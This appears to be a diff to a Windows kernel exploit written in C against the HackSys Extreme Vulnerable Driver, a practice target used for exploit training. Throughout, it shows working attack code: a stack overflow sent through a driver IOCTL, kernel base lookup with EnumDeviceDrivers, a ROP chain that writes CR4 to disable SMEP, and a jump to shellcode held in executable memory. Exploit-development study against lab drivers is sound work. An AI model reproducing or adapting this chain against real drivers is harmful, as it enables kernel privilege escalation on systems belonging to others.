@@ -13,6 +13,19 @@ The payload is work in progress.
 //ioctl code to trigger Stack Overflow vulnerability
 #define IOCTL_CODE 0x222003
 
+// Get base of ntoskrnl.exe
+LPVOID GetNTOsBase()
+{
+	LPVOID Bases[0x1000];
+	DWORD needed = 0;
+	LPVOID krnlbase = NULL;
+	if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed)) {
+		krnlbase = Bases[0];
+	}
+	return krnlbase;
+}
+
+
 int main()
 {
     //Create Handle to HEVD Driver
@@ -43,7 +56,7 @@ int main()
     //Overflow Buffer in HEVD
     char payload[2104];
     //Offset until EIP Overwrite
-    const size_t offsetEIP = 2080;
+    int offsetEIP = 2080;
 
     //Fill junk offset with 'A' until EIP overwrite
     memset(payload, 'A', sizeof(payload));
@@ -69,56 +82,87 @@ int main()
         0x6e, 0x58};
 
     //Allocate (executable) memory for shellcode
-    LPVOID shellcode_ptr = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!shellcode_ptr)
     {
         printf("Couldn't allocate shellcode :(\n");
         exit(-1);
     }
+
+
     //Move Shellcode into memory segment from VirtualAlloc()
     RtlMoveMemory(shellcode_ptr, shellcode, sizeof(shellcode));
 
+    printf("Shellcode @ 0x%x\n", (INT_PTR)shellcode_ptr);
+
     printf("Getting Kernel Base Address\n");
 
-    LPVOID drivers[1024];
-    LPDWORD cbNeeded;
-
     //Enumerate device drivers to get kernel address
-    BOOL drivEnum = EnumDeviceDrivers(drivers, sizeof(drivers), cbNeeded);
+    //Kernel ('nt' module) base address
+    LPVOID kernelBaseAddr = GetNTOsBase(); 
 
-    if (drivEnum == 0)
-    {
-        printf("Couldn't get kernel base address :(\n");
-        printf("Required size ob cb: %x", &cbNeeded);
+    if (!kernelBaseAddr) {
+        printf("Failed to get base address :(\n");
         exit(-1);
     }
 
-    //Kernel ('nt' module) base address (first element in drivers array)
-    PVOID kernelBaseAddr = {0};
-    kernelBaseAddr = drivers[0];
+    printf("[*] Kernel base address @ 0x%x\n", kernelBaseAddr);
 
-    printf("[*] Kernel base address @ %p", kernelBaseAddr);
+    printf("Building Rop chain...\n");
 
-    printf("Building Rop chain");
-
+    /*
     const size_t popEaxOffset = offsetEIP;
     const size_t paddingOffset = offsetEIP + (size_t)0x4;
     const size_t smepOffset = offsetEIP + (size_t)0xc;
     const size_t cr4EaxOffset = offsetEIP + (size_t)0x10;
     const size_t shellcodeOffset = offsetEIP + (size_t)0x14;
+    */
 
-    PVOID popEax = (int *)kernelBaseAddr + 0x19a536;
-    PVOID cr4Eax = (int *)kernelBaseAddr + 0x0010bfeb;
+    //ROP Gadget: nt!_MapCmDevicePropertyToNtProperty+0x39 (pop eax; ret)
+    LPVOID popEax = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0010c04b);
+    //ROP Gadget: nt!KeFlushCurrentTb+0x9 (mov cr4,eax; ret)
+    LPVOID cr4Eax = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0019a646);
+
+    printf("[*] \'pop eax; ret\'-Gadget @ 0x%x\n", popEax);
+    printf("[*] \'mov cr4, eax\'-Gadget @ 0x%x\n", cr4Eax);
+
+    char padding[8];
+
+    //Add padding 
+    memset(padding, 'B', sizeof(padding));
 
     int smepValue = 0x000406e9;
 
-    //Copy ROP chain into payload
-    memcpy(&payload[popEaxOffset], popEax, 0x4);
-    memcpy(&payload[paddingOffset], 'B', 0x8);
-    memcpy(&payload[smepOffset], smepValue, 0x4);
-    memcpy(&payload[cr4EaxOffset], cr4Eax, 0x4);
-    memcpy(&payload[shellcodeOffset], &shellcode_ptr, 0x4);
+    INT_PTR ropBuf = (INT_PTR)(payload + offsetEIP);
 
+    printf("Starting EIP overwrite address @ 0x%x\n", ropBuf);
+
+    *(INT_PTR*)ropBuf = (INT_PTR)popEax;
+    *(INT_PTR*)(ropBuf + 4 * 1) = (INT_PTR)padding;
+    *(INT_PTR*)(ropBuf + 4 * 3) = (INT_PTR)smepValue;
+    *(INT_PTR*)(ropBuf + 4 * 4) = (INT_PTR)cr4Eax;
+    *(INT_PTR*)(ropBuf + 4 * 5) = (INT_PTR)shellcode_ptr;
+
+    /*
+    printf("What memcpy doing?\n");
+    //Copy ROP chain into payload
+    printf("&payload[popEaxOffset] @ 0x%x\n", &payload[popEaxOffset]);
+    printf("payload starting address @ 0x%x\n", &payload[0]);
+    printf("Size popEax: %d\n", sizeof(popEax));
+    printf("popEaxOffset: %d\n", popEaxOffset);
+    memcpy(&payload[popEaxOffset], popEax, 0x4);
+    printf("&payload[paddingOffset] @ 0x%x", &payload[paddingOffset]);
+    memcpy(&payload[paddingOffset], padding, sizeof(padding));
+    printf("&payload[smepOffset] @ 0x%x", &payload[smepOffset]);
+    memcpy(&payload[smepOffset], &smepValue, 0x4);
+    printf("&payload[cr4EaxOffset] @ 0x%x", &payload[cr4EaxOffset]);
+    memcpy(&payload[cr4EaxOffset], cr4Eax, 0x4);
+    printf("&payload[shellcodeOffset] @ 0x%x", &payload[shellcodeOffset]);
+    memcpy(&payload[shellcodeOffset], &shellcode_ptr, 0x4);
+    */
+
+
+    printf("Payload length: 0x%x\n", sizeof(payload));
     printf("Sending Driver Payload!\n");
 
     //Send exploit to driver
@@ -128,3 +172,4 @@ int main()
 
     CloseHandle(drivObjHndl);
 }
+
